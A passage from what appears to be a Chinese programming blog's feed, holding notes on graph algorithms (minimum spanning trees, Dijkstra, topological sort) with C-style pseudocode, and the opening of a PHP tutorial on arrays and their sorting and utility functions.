href="https://blog.csdn.net/qq_62213124/article/details/121597780?ops_request_misc=%7B%22request%5Fid%22%3A%22170063514316800184173992%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=170063514316800184173992&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121597780-null-null.142%5Ev96%5Epc_search_result_base5&amp;utm_term=prim%E7%AE%97%E6%B3%95%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91&amp;spm=1018.2226.3001.4187">最小生成树——Prim算法（详细图解）_prim最小生成树_skynesser的博客-CSDN博客</a>。</p><p>有一种实现方法是分别储存所有顶点node、是否被访问selected、权值minDist、父母顶点parent。</p><p>首先将所有顶点的selected栏设为False，所有顶点的minDist为inf，parent为-1。然后初始化第一个顶点selected状态为True，minDist为空，parent仍为-1。</p><p>接下来开始进行遍历操作，分为三步：更新Update、扫描Scan、添加Add。每次访问（这里还没有更新状态）与已有顶点相连接的其他顶点时，都更新顶点的权值以及父母顶点。随后扫描到最小的权值，将该两个顶点连接并将更新selected状态。重复上述步骤直到所有的顶点都被访问，此时selected都为True且minDist均为 - ，最小生成树储存在parent中（对应点和点之间的连接关系）。</p><h4 id="克鲁斯卡尔kruskal算法"><a class="markdownIt-Anchor" href="#克鲁斯卡尔kruskal算法"></a> 克鲁斯卡尔/Kruskal算法</h4><p>该算法的思想比较简单。首先将连通图的所有边按照权重从小到大排序放入一个列表中，然后依次向图中加入边。每次添加一条边都要进行一次判断：添加边后该图是否形成环？若没有，则边成功添加入图，边数加一；若形成环，则丢弃这条边，边数不变。当边数达到n-1时（假设该图一共有n个顶点），说明找到了最小生成树，算法结束。</p><p>这里也借鉴其他人的博客<a href="https://blog.csdn.net/hzf0701/article/details/107933639?ops_request_misc=%7B%22request_id%22:%22170063754216800225570435%22,%22scm%22:%2220140713.130102334..%22%7D&amp;request_id=170063754216800225570435&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107933639-null-null.142%5Ev96%5Epc_search_result_base5&amp;utm_term=">Kruskal算法简易教程（附最全注释代码实现）-CSDN博客</a>。就不详细写出算法实现了（参考书中利用了不相交集和优先队列实现）。</p><p>该算法的关键问题是如何判断图形成了环。</p><h3 id="最短路径问题"><a class="markdownIt-Anchor" href="#最短路径问题"></a> 最短路径问题</h3><p>最短路径问题一般是给定一个图G=(V,E)和一个顶点s，需要求出顶点s到达其余每个顶点的最短路径。采用何种最短路径算法依赖于图的类型。我将最短路径算法和图的类型进行的简单的归纳。</p><table><thead><tr><th>图的类型</th><th>算法</th></tr></thead><tbody><tr><td>无权图的最短路径</td><td>“朴素算法”</td></tr><tr><td>有权图的最短路径</td><td>迪杰斯特拉算法/Dijkstra算法</td></tr><tr><td>具有负权重边的最短路径</td><td>贝尔曼福特算法/Bellman-Ford算法</td></tr></tbody></table><p>下面我们依次来介绍这些情况。</p><h4 id="朴素算法"><a class="markdownIt-Anchor" href="#朴素算法"></a> “朴素算法”</h4><p>这个算法是我自己命名的。无权图的最短路径其实可以视为权重均为1的有权图，是一种有权图的特殊情况。由于实际情况中应用较少，且完全可以用处理有权图的迪杰斯特拉算法兼容，我们这里先暂时跳过介绍该算法。（兴许以后有时间会补上）</p><h4 id="迪杰斯特拉dijkstra算法"><a class="markdownIt-Anchor" href="#迪杰斯特拉dijkstra算法"></a> 迪杰斯特拉/Dijkstra算法</h4><p>迪杰斯塔拉算法是一个经典而伟大的算法，经过一个星期的咀嚼我觉得已经悟的差不多了。传统的BFS算法无法解决最短路径问题，因为它无法保证队列前面的顶点是最接近源点s的顶点。因此，应用这个算法我们还需要两种辅助的数据结构。</p><ul><li>具有三列（每行对应一个顶点）的一个距离表<ul><li>顶点的序号/名称</li><li>距离源顶点的距离Distance[v]。源点到自身的距离为0，其余顶点在距离表中的距离被初始化为-1。</li><li>路径Path[v]——包含抵达该顶点的前驱顶点的名称，通过该顶点我们可以得到最短距离。</li></ul></li><li>优先队列。使用优先队列来储存尚未被处理的顶点，并始终弹出距离源顶点最短距离的顶点先处理，符合贪心原则。这里我们采用的是基于二项堆实现的优先队列。</li></ul><p>算法结束时，距离表中将储存所有顶点到达源顶点的最短距离。同时我们可以根据距离表中每个顶点对应的前驱顶点往前追溯直到回到源点为止，这个过程所经过的路径实际上就是源点到达该点的最短路径（由于我们是从终点向起点追溯，你也可以称为是选定顶点到源点的最短路径）。</p><p>关于迪杰斯特拉算法有以下三点需要特别注意：</p><ul><li>它使用了贪婪法：总是选择下一个距离源点最近的顶点。</li><li>利用优先队列来实现贪婪，按照当前距离s的距离大小来储存还未确定最短路径的节点。</li><li>迪杰斯特拉算法不适用于处理带有负权重的有权图。</li></ul><p>接下来我们给出迪杰斯特拉算法的伪代码实现（因为表示图的方法不同，所以只好用伪代码表示）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Dijkstra</span><span class="params">(<span class="keyword">struct</span> Graph*G,<span class="type">int</span> s)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PriorityQueue</span>*<span class="title">PQ</span>=</span>CreatPriorityQueue();</span><br><span class="line">    <span class="type">int</span> v,w;</span><br><span class="line"></span><br><span class="line">    EnQueue(PQ,s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;</span><br><span class="line">        Distance[i]=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Distance[s]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyQueue(PQ))&#123;</span><br><span class="line">        v=DeleteMin(PQ);</span><br><span class="line">        对于顶点v的所有邻接顶点w&#123;</span><br><span class="line">            计算新距离d=Distance[v]+weight[v][w];</span><br><span class="line">            <span class="keyword">if</span>(Distance[w]==<span class="number">-1</span>)&#123;<span class="comment">//说明该邻接顶点还未确定最短路径</span></span><br><span class="line">                Distance[w]=new distance d;</span><br><span class="line">                将具有优先级d的顶点w插入优先队列中</span><br><span class="line">                Path[w]=v;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(Distance[w]&gt;new distance d)&#123;<span class="comment">//说明经过该邻接顶点的路径比之前已经确定的最短路径更优</span></span><br><span class="line">                Distance[w]=new distance d;</span><br><span class="line">                将w的优先级更新为d;</span><br><span class="line">                Path[w]=v</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="更详细的解释"><a class="markdownIt-Anchor" href="#更详细的解释"></a> 更详细的解释</h5><p>我对于迪杰斯特拉算法的理解，其实就是贪心+层次遍历/BFS。该算法利用BFS将顶点全部存入队列中遍历处理，但是由于贪心的需要所以采用优先队列保证每次先处理距离源点最近的顶点，计算其距离看是否会得到更小的距离。如果该顶点还未确认最短路径（Distance[w]==-1）就暂且默认该路径为最短路径，更新距离表；如果能使得路径更短（Distance[w]&gt;new distance d），说明经过该邻接顶点的路径比之前已经确定的最短路径更优，就重置节点优先级（更新优先队列）并更新距离表。这样最后距离表就能得到源顶点到其他所有顶点的最短路径。</p><p>这里我按照邻接表的结构完善了伪代码，这里放出来仅供参考。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Dijkstra</span><span class="params">(<span class="keyword">struct</span> Graph* G, <span class="type">int</span> s, <span class="keyword">struct</span> DistanceMap* <span class="built_in">map</span>)</span> &#123;<span class="comment">//传入图和距离表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Heap</span>* <span class="title">h</span> =</span> CreatHeap(G-&gt;V, MIN_HEAP);<span class="comment">//创建堆作为优先队列辅助</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp</span>;</span><span class="comment">//建立临时节点来储存邻接顶点</span></span><br><span class="line">    <span class="type">int</span> v, w, d;<span class="comment">//分别表示当前顶点，当前顶点的邻接顶点，两者的距离</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;V; ++i) &#123;<span class="comment">//初始化距离表</span></span><br><span class="line">        <span class="built_in">map</span>[i].vertexNumber = i;</span><br><span class="line">        <span class="built_in">map</span>[i].Distance = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">map</span>[s].Distance = <span class="number">0</span>;<span class="comment">//设置源顶点距离为0</span></span><br><span class="line">    <span class="built_in">map</span>[s].Path = s;<span class="comment">//默认源顶点的路径为其本身</span></span><br><span class="line">    Insert(h, s, <span class="built_in">map</span>);<span class="comment">//将源顶点插入优先队列中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!IsEmptyHeap(h)) &#123;</span><br><span class="line">        v = DeleteElement(h, <span class="built_in">map</span>);<span class="comment">//弹出最小距离的顶点，开始贪心</span></span><br><span class="line">        temp = &amp;G-&gt;Adj[v];</span><br><span class="line">        <span class="keyword">while</span> (temp-&gt;next-&gt;vertexNumber != v) &#123;</span><br><span class="line">            temp = temp-&gt;next;<span class="comment">//temp储存邻接顶点</span></span><br><span class="line">            w = temp-&gt;vertexNumber;<span class="comment">//w表示邻接顶点的顶点序号</span></span><br><span class="line">            d = <span class="built_in">map</span>[v].Distance + temp-&gt;dis;<span class="comment">//邻接顶点到源点的距离计算为v顶点到源点的距离加上邻接顶点w到v顶点的距离</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>[w].Distance == <span class="number">-1</span>) &#123;<span class="comment">//邻接顶点未确定最短路径的情况</span></span><br><span class="line">                <span class="built_in">map</span>[w].Distance = d;</span><br><span class="line">                Insert(h, w, <span class="built_in">map</span>);</span><br><span class="line">                <span class="built_in">map</span>[w].Path = v;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>[w].Distance &gt; d) &#123;<span class="comment">//邻接顶点已经确认最短路径但是出现了更优路径都是情况</span></span><br><span class="line">                <span class="built_in">map</span>[w].Distance = d;</span><br><span class="line">                PercolateDown(h, <span class="number">0</span>, <span class="built_in">map</span>);<span class="comment">//更新优先队列</span></span><br><span class="line">                <span class="built_in">map</span>[w].Path = v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    DestroyHeap(h);<span class="comment">//销毁优先队列</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="不足之处"><a class="markdownIt-Anchor" href="#不足之处"></a> 不足之处</h5><p>迪杰斯特拉算法主要有以下两个问题。</p><ul><li>该算法本质上是基于贪心的盲目搜索，会浪费时间和必要的资源。</li><li>该算法不能处理负权重的边，这种情况下要采用贝尔曼-福特/Bellman-Ford算法。</li></ul><h4 id="贝尔曼-福特bellman-ford算法"><a class="markdownIt-Anchor" href="#贝尔曼-福特bellman-ford算法"></a> 贝尔曼-福特/Bellman-Ford算法</h4><p>关于这一部分，我这本书上讲的不是一般的烂，给出的算法无法处理负权环，所以暂时就先跳过这一部分（再次给朋友们避雷这个叫纳拉辛哈·卡路曼希的印度人写的C语言数据结构书）。</p><p>这里放出WAHAHA佬对于Bellman-Ford算法的博客，可以先用这篇文章作为代餐：<a href="https://gngtwhh.github.io/2023-11-30-9ab73a7c6d7f/">Bellman-Ford算法 | WAHAHA’s blog (gngtwhh.github.io)</a>。</p><h3 id="拓扑排序"><a class="markdownIt-Anchor" href="#拓扑排序"></a> 拓扑排序</h3><p>拓扑排序是个很有趣的东西。比起一般的图结构和排序，它特殊在是用边来表示信息的。</p><p>给定一个<em>有向无环图（DAG）</em>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/f805b876f56a464895ba1c78db777c7d.png" alt="有向无环图" /></p><p>我们假设这是大学的课程先决条件，其中的有向边(v,w)表示必须要先完成课程v才能学习课程w。在这种情况下，拓扑排序就是不违背先决条件的课程学习顺序。每个DAG可能有一个或者多个拓扑排序序列，比如对于上图A-&gt;B-&gt;D-&gt;C和A-&gt;C-&gt;B-&gt;D都是合理的拓扑排序。前提是该图不能存在回路，否则拓扑排序将不存在，因为此时v将先于w同时w也会先于v。</p><p>拓扑排序还有一个有趣的性质，如果排序中所有连续的顶点构成的顶点对之间都通过边来联系，那么这些边构成DAG中一个有向的哈密尔顿路径，此时拓扑排序唯一。（哈密尔顿路径后续随缘更新……）</p><p>那么我们如何实现拓扑排序的算法呢？以下是我的一些思路。首先对于所有顶点计算其<em>入度</em>，然后从入度为0的点开始处理。这意味着拓扑排序将从没有先决条件的顶点开始。为了跟踪这些顶点，我们用队列来储存这些顶点。</p><p>入度为0的顶点都存入队列中，当队列不为空时，队首顶点v出列，并且由v发出的边到达的所有邻接顶点入度全部减1.如果有顶点因此入度减小到了0（说明先决条件全部被满足），该顶点就被存入队列中。拓扑排序就是顶点的出队顺序。</p><p>以下给出拓扑排序的伪代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">TopologicalSort</span><span class="params">(<span class="keyword">struct</span> Graph*G)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>*<span class="title">Q</span>;</span></span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line">    <span class="type">int</span> v,m;</span><br><span class="line">    Q=CreatQueue();</span><br><span class="line">    counter=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> v = <span class="number">0</span>; v &lt; G-&gt;V; ++v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (indegree[v] == <span class="number">0</span>)</span><br><span class="line">            EnQueue(Q, v);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">while</span> (!IsEmptyQueue(Q))&#123;</span><br><span class="line">            v=DeQueue(Q);</span><br><span class="line">            topologicalOrder[v]=++counter;<span class="comment">//出队顺序序号</span></span><br><span class="line">            对于邻接v的每个w&#123;</span><br><span class="line">                <span class="keyword">if</span>(--indegree[w]==<span class="number">0</span>)</span><br><span class="line">                    EnQueue(Q,w);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(counter!=G-&gt;V)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Graph has circle!\n&quot;</span>);</span><br><span class="line">    DeleteQueue(Q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr /><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/River%20&amp;%20Faye.png" alt="River &amp; Faye" /></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP碎碎念（三）——数组那些事</title>
      <link href="/posts/ae92502954a3/"/>
      <url>/posts/ae92502954a3/</url>
      
        <content type="html"><![CDATA[<p>和其他语言一样，PHP也有数组。但是不同于C语言，PHP的数组更加灵活而且方法更加多样化，这一点类似于Python中的字典。主要是因为PHP的数组可以不局限于数字索引，也就是说数组允许自定义索引。</p><p>话不多说，进入正题。我们先从数字索引数组开始介绍，然后再讲自定义索引数组，最后介绍一些处理数组的方法。</p><h2 id="数字索引数组"><a class="markdownIt-Anchor" href="#数字索引数组"></a> 数字索引数组</h2><p>和大多数编程语言一样，在PHP中的数字数组索引也是从0开始的。当然，这一点可以更改。</p><h3 id="初始化"><a class="markdownIt-Anchor" href="#初始化"></a> 初始化</h3><p>PHP数组的初始化有以下几种方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="keyword">array</span>(<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>);</span><br><span class="line"><span class="variable">$name</span>=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>];<span class="comment">//PHP5.4版本后支持</span></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">10</span>);<span class="comment">//储存1到10的数字</span></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">range</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;z&#x27;</span>);<span class="comment">//储存字符a到z</span></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">file</span>(<span class="string">&quot;outputs.txt&quot;</span>);<span class="comment">//从文件导入数组，每一行作为一个元素</span></span><br></pre></td></tr></table></figure><p>后面几种声明数组的方式看起来有点像Python中的列表，但是要注意这两者并不是完全相同。比如range()函数，在PHP中<code>range(1,10)</code>是输出1到10，而Python则是输出1到9,10的边界是一个开集。</p><p>最后提到的从文件导入数组用到了第二章提到过的file()函数，详细内容可以回看一下第二章。</p><p>另外，PHP支持数组间等号的重载，如果你想把一个数组中的数据保存在另一个数组中，直接使用等号就行。</p><h3 id="访问数组"><a class="markdownIt-Anchor" href="#访问数组"></a> 访问数组</h3><p>这部分和C等其他语言的规则大致相同，不多赘述。你可以使用<code>$name[0]</code>来访问第一个元素，但是PHP也允许你用{}大括号来代替中括号。</p><p>另外，PHP的数组长度是动态的，和Python和C都不太一样。在C中你需要实现指定数组的长度，Python中添加元素需要调用列表的方法append()，但是在PHP中允许你直接声明一个新的元素。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>[<span class="number">4</span>]=<span class="string">&#x27;jjg&#x27;</span><span class="comment">//这行代码会直接为$name数组添加第四个元素</span></span><br></pre></td></tr></table></figure><p>如果下标相同，等同于更改原索引对应的数组值。如果这个数组一开始并不存在，PHP会创建一个只包含一个元素的新的数组。</p><h4 id="循环访问数组"><a class="markdownIt-Anchor" href="#循环访问数组"></a> 循环访问数组</h4><p>我们之前提到了通过数组下标来访问数组，但是正如其他语言中一样，PHP也可以使用循环来访问数组，效率更高也更强大，下面介绍几个循环函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">3</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$name</span>[<span class="variable">$i</span>].<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;<span class="comment">//经典的for循环，和C语言一样的语法，但是不适用于自定义索引数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$name</span> <span class="keyword">as</span> <span class="variable">$n</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$n</span>.<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;<span class="comment">//foreach是PHP中的特性函数，允许$n表示数组中的每一个元素，减少了手工输入量，非常方便</span></span><br></pre></td></tr></table></figure><h2 id="自定义索引数组"><a class="markdownIt-Anchor" href="#自定义索引数组"></a> 自定义索引数组</h2><p>正如我们前文提到的那样，PHP可以自定义索引，其创建方法类似于Python中的字典，也就是包含一个键名和对应的值。下面是自定义索引数组的创建方法.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$names</span>=<span class="keyword">array</span>(<span class="string">&#x27;fname&#x27;</span>=&gt;<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>=&gt;<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;nname&#x27;</span>=&gt;<span class="string">&#x27;jjg&#x27;</span>);</span><br><span class="line"><span class="variable">$names</span>[<span class="string">&#x27;nname&#x27;</span>]=<span class="string">&#x27;JJG&#x27;</span>;</span><br></pre></td></tr></table></figure><p>键和值之间的连接符号是<code>=&gt;</code>，有点奇怪，挺象形的只能说。</p><p>由于数组的索引不再是整数，所以使用for循环访问数组元素的时候，就不能简单的使用经典的for循环，而要使用foreach循环或者each()和list()结构。</p><p>形式如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$names</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;<span class="comment">//这里用$key和$value分别代表数组中一个元素的键名和值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&quot; - &quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$e</span> = <span class="title function_ invoke__">each</span>(<span class="variable">$names</span>))&#123;<span class="comment">//each()函数会返回数组当前所指元素，然后指向下一个元素</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>[<span class="string">&#x27;key&#x27;</span>].<span class="string">&quot; - &quot;</span>.<span class="variable">$e</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">reset</span>(<span class="variable">$names</span>);<span class="comment">//数组会记得自己指向了哪个元素，如果想再次循环遍历该数组，需要使用reset()函数将数组指针重新指向首元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">list</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)=<span class="title function_ invoke__">each</span>(<span class="variable">$names</span>))&#123;<span class="comment">//比上面的方式更好，list()会把元素分离成两部分并将其储存在两个新变量中</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot; - &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组操作符"><a class="markdownIt-Anchor" href="#数组操作符"></a> 数组操作符</h2><p>PHP有一组对数组的操作符，大多数这些操作符都有与之对应的标量操作符，将其整理如下。</p><table><thead><tr><th>操作符</th><th>名称</th><th>实例</th><th>结果</th></tr></thead><tbody><tr><td>+</td><td>联合</td><td>$a+$b</td><td>数组a、b联合。将数组b中的元素添加到数组a中。如果键名冲突该元素将不会被添加。</td></tr><tr><td>==</td><td>等价</td><td>$a==$b</td><td>如果数组a、b<strong>包含相同元素</strong>，返回true</td></tr><tr><td>===</td><td>恒等</td><td>$a===$b</td><td>如果数组a、b<strong>包含相同顺序和类型的元素</strong>，返回true</td></tr><tr><td>!=</td><td>不等价</td><td>$a!=$b</td><td>不包含相同元素</td></tr><tr><td>&lt;&gt;</td><td>不等价</td><td>$a&lt;&gt;$b</td><td>和!=相同</td></tr><tr><td>!==</td><td>不恒等</td><td>$a!==$b</td><td>不恒等</td></tr></tbody></table><p>这些操作符也可以拿来比较标量，一般来说数组和标量无法比较，会抛出一个false。利用这一点可以在某些CTF的PHP代码审计中绕过一些判定方法，比如传入一个数组和某个非数组值进行比较。</p><h2 id="多维数组"><a class="markdownIt-Anchor" href="#多维数组"></a> 多维数组</h2><p>关于多维数组的部分不过多展开，一来这部分比较晦涩复杂，平时最多用到二维数组，极少用到三维数组；二是多维数组的概念和C等语言类似，没必要多开篇幅介绍。在PHP中多维数组就是简单的数组嵌套，用多个array()函数嵌套即可声明一个多维数组。</p><p>除了多维数组的概念，关于一些多维数组的操作（如排序）也将暂时跳过。</p><h2 id="数组排序"><a class="markdownIt-Anchor" href="#数组排序"></a> 数组排序</h2><p>在PHP中定义了许多有用的方法来对数组进行排序，而不用想C语言一样造轮子。</p><h3 id="sort"><a class="markdownIt-Anchor" href="#sort"></a> sort()</h3><p>sort()是一个功能强大的函数：无论是字符串数组还是数字数组，都将按照升序排列进行排序。其中字母排序区分字母大小写，大写字母永远在小写字母前面，即按照ASCII码进行排序。同理，数字永远排在字母前面。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$names</span>=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;2a&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$names</span>);</span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$names</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$names</span>);</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231109220142615.png" alt="image-20231109220142615" /></p><p>sort()函数的第二个参数是可选的。这些参数是SORT_REGULAR、SORT_NUMBERIC、SORT_STRING、SORT_LOCAL_STRING、SORT_NATURAL、SORT_FLAG_CASE。这些参数虽然很有用，但是实际上很少用到（至少在CTF从来没碰到过）。贴了一段别的大佬博客归纳。</p><blockquote><ol><li>SORT_REGULAR：按照常规比较方式排序（不改变类型）</li><li>SORT_NUMERIC：按照数值比较方式排序</li><li>SORT_STRING：按照字符串比较方式排序</li><li>SORT_LOCALE_STRING：按照本地化字符串比较方式排序</li><li>SORT_NATURAL：按自然顺序对字符串进行排序(与SORT_STRING相同),同时不区分大小写</li><li>SORT_FLAG_CASE：可以联合使用喜欢SORT_STRING或SORT_NATURAL，在进行字母的比较时不区分大小写</li></ol></blockquote><p>要实现降序排序也很简单，使用rsort()函数即可将元素按照降序顺序排列。</p><h3 id="asort和ksort"><a class="markdownIt-Anchor" href="#asort和ksort"></a> asort()和ksort()</h3><p>这两个函数作用机理和sort()函数相同，只是作用对象为自定义索引数组。如果你想根据键名来排序，选择ksort()，否则选择asort()来按照元素的值进行排序。如果想要按照降序排序也一样可以使用arsort()或者krsort()函数。</p><h3 id="usort"><a class="markdownIt-Anchor" href="#usort"></a> usort()</h3><p>usort()中的‘u’代表‘user’，意味着这是个由用户自定义的排序函数。在使用这个函数时，首先要自定义一个比较函数，比如我需要按照一个数组的第三项去进行排序，我可以编写如下代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compare</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$x</span>[<span class="number">1</span>]==<span class="variable">$y</span>[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span> (<span class="variable">$x</span>[<span class="number">1</span>]&lt;<span class="variable">$y</span>[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$names</span>,<span class="string">&#x27;compare&#x27;</span>);<span class="comment">//传入待排序的数组和自定义比较函数名</span></span><br></pre></td></tr></table></figure><p>调用usort()函数没有反向变体，但是你可以直接修改自定义比较函数的返回值达到反向排序的效果。</p><h3 id="shuffle"><a class="markdownIt-Anchor" href="#shuffle"></a> shuffle()</h3><p>向shuffle()函数传入数组，它会将数组元素顺序打乱随机排序。</p><h3 id="array_reverse"><a class="markdownIt-Anchor" href="#array_reverse"></a> array_reverse()</h3><p>array_reverse()函数会将数组按照与原来的排序相反的顺序进行排序，但是这个函数只返回排序后数组的副本，不会改变原数组。要改变原数组，将返回值赋予原数组就好。</p><h2 id="其他数组操作"><a class="markdownIt-Anchor" href="#其他数组操作"></a> 其他数组操作</h2><p>除了以上介绍的这些处理数组的函数，还有一些函数也很有用，这里就简要的介绍一下。</p><h3 id="explode"><a class="markdownIt-Anchor" href="#explode"></a> explode()</h3><p>向函数传递一个分隔符和字符串，可以将字符串根据分隔符分隔为不同的元素并作为数组返回。</p><h3 id="each和next和current"><a class="markdownIt-Anchor" href="#each和next和current"></a> each()和next()和current()</h3><p>在前文介绍了each()函数会返回数组当前所指值并指向下一个元素，而next()则是直接指向下一个元素再返回元素值。current()函数则是返回目前数组指向元素的值。</p><h3 id="reset和end"><a class="markdownIt-Anchor" href="#reset和end"></a> reset()和end()</h3><p>前文介绍过reset()函数会重置数组指针并返回第一个数组元素值，而end()函数则刚好相反：它直接指向最后一个元素并返回最后一个元素值。</p><h3 id="prev和pos"><a class="markdownIt-Anchor" href="#prev和pos"></a> prev()和pos()</h3><p>prev()函数和next()函数相反，它将指针回移一位并返回所指值。而pos()函数则是current()函数的别名。</p><h3 id="countsizeof和array_count_values"><a class="markdownIt-Anchor" href="#countsizeof和array_count_values"></a> count()/sizeof()和array_count_values()</h3><p>count()函数返回数组中元素的个数，sizeof()函数是它的一个别名。而array_count_values()则返回一个数组，内含传入数组元素的出现频率表，统计每个元素在该数组中出现的次数。</p><h3 id="extract"><a class="markdownIt-Anchor" href="#extract"></a> extract()</h3><p>这个函数很有意思，它会把数组中的关键字-值对转换成一系列标量变量。具体用法如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$names</span>=<span class="keyword">array</span>(<span class="string">&#x27;fname&#x27;</span>=&gt;<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>=&gt;<span class="string">&#x27;Ben&#x27;</span>,<span 